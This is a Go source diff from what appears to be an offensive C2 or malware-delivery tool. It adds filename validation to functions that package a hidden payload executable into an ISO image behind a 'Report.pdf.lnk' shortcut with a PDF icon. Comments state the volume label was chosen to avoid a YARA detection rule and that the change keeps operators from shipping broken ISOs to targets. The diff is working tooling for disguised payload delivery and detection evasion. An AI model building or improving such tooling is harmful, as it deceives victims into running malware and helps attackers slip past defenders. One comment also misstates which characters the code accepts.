@@ -198,6 +198,35 @@ func BuildLnkForExeWithIcon(exeFile string, iconPath string) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
+// isoEntryName normalizes and VALIDATES a name for an ISO 9660 directory record.
+//
+// The builders used to upper-case whatever they were given and append ";1": a name longer than the
+// record allows, or one containing a separator or a non-ASCII rune, produced an image whose
+// directory record was malformed - the operator then shipped a broken ISO to a target and only
+// found out when it would not open. ISO 9660 level 1 allows A-Z, 0-9, "_" and "." here.
+func isoEntryName(name, fallback string) (string, error) {
+	name = strings.TrimSpace(name)
+	if name == "" {
+		name = fallback
+	}
+	name = strings.ToUpper(name)
+	name = strings.TrimSuffix(name, ";1")
+	if len(name) == 0 || len(name) > 64 {
+		return "", fmt.Errorf("name %q must be 1-64 characters", name)
+	}
+	if strings.ContainsAny(name, " /\\:;") {
+		return "", fmt.Errorf("name %q must not contain a space, separator or semicolon", name)
+	}
+	for _, r := range name {
+		okLetter := r >= 'A' && r <= 'Z'
+		okDigit := r >= '0' && r <= '9'
+		if !okLetter && !okDigit && r != '_' && r != '.' && r != '-' {
+			return "", fmt.Errorf("name %q may only contain A-Z, 0-9, dot, dash and underscore", name)
+		}
+	}
+	return name + ";1", nil
+}
+
 // BuildISOWithLNK writes a minimal ISO 9660 containing a visible LNK (pdf icon) + hidden exe.
 // The ISO when mounted shows Report.pdf.lnk (PDF icon) that launches the hidden payload exe.
 // Volume label changed to REPORTS to avoid FORGEC2 YARA.
@@ -208,18 +237,15 @@ func BuildISOWithLNK(lnkName string, exeName string, exeData []byte) ([]byte, er
 	if exeName == "" {
 		exeName = "Report.pdf.exe"
 	}
-	lnkName = strings.ToUpper(lnkName)
-	if !strings.Contains(lnkName, ".") {
-		lnkName += ".LNK;1"
-	} else if !strings.Contains(lnkName, ";") {
-		lnkName += ";1"
+	normalizedLnk, err := isoEntryName(lnkName, "Report.pdf.lnk")
+	if err != nil {
+		return nil, err
 	}
-	exeName = strings.ToUpper(exeName)
-	if !strings.Contains(exeName, ".") {
-		exeName += ";1"
-	} else if !strings.Contains(exeName, ";") {
-		exeName += ";1"
+	normalizedExe, err := isoEntryName(exeName, "Report.pdf.exe")
+	if err != nil {
+		return nil, err
 	}
+	lnkName, exeName = normalizedLnk, normalizedExe
 	trimmedExe := strings.TrimSuffix(exeName, ";1")
 	lnkData, err := BuildLnkForExeWithIcon(trimmedExe, DisguiseLnkIcon("pdf", trimmedExe))
 	if err != nil {
@@ -289,12 +315,11 @@ func BuildISO9660(filename string, data []byte) ([]byte, error) {
 	if filename == "" {
 		filename = "README.TXT"
 	}
-	filename = strings.ToUpper(filename)
-	if !strings.Contains(filename, ".") {
-		filename += ";1"
-	} else if !strings.Contains(filename, ";") {
-		filename += ";1"
+	normalized, err := isoEntryName(filename, "README.TXT")
+	if err != nil {
+		return nil, err
 	}
+	filename = normalized
 
 	const sector = 2048
 	// Layout: 16 empty sectors, PVD at 16, terminator at 17, root dir at 18, file at 19+
